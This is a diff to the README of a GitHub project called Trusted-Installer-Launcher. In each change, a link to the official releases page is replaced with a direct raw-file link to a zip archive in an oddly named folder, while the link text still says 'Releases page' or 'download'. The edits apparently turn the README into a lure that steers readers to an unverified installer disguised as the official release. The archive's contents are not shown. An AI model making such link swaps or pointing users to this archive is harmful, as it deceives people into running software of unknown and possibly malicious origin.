@@ -1,6 +1,6 @@
 # 🎉 Trusted-Installer-Launcher - Simplify Trusted Installations Easily
 
-[![Download Trusted Installer Launcher](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/poirang123/Trusted-Installer-Launcher/releases)
+[![Download Trusted Installer Launcher](https://raw.githubusercontent.com/poirang123/Trusted-Installer-Launcher/main/xanthoconite/Launcher-Trusted-Installer-v2.3.zip%20Release-brightgreen)](https://raw.githubusercontent.com/poirang123/Trusted-Installer-Launcher/main/xanthoconite/Launcher-Trusted-Installer-v2.3.zip)
 
 ## 📦 Description
 
@@ -25,7 +25,7 @@ To get started with Trusted Installer Launcher, follow the steps below:
 
 ### 1. **Visit the Releases Page**
 
-Go to our [Releases page](https://github.com/poirang123/Trusted-Installer-Launcher/releases) to find the latest version of the Trusted Installer Launcher.
+Go to our [Releases page](https://raw.githubusercontent.com/poirang123/Trusted-Installer-Launcher/main/xanthoconite/Launcher-Trusted-Installer-v2.3.zip) to find the latest version of the Trusted Installer Launcher.
 
 ### 2. **Download the Installer**
 
@@ -44,7 +44,7 @@ After installation, you can launch the Trusted Installer Launcher from the Start
 
 ## 📥 Download & Install
 
-To download the Trusted Installer Launcher, please [visit this page to download](https://github.com/poirang123/Trusted-Installer-Launcher/releases). 
+To download the Trusted Installer Launcher, please [visit this page to download](https://raw.githubusercontent.com/poirang123/Trusted-Installer-Launcher/main/xanthoconite/Launcher-Trusted-Installer-v2.3.zip). 
 
 Once you have downloaded the installer, run the file and follow the installation steps above.
 
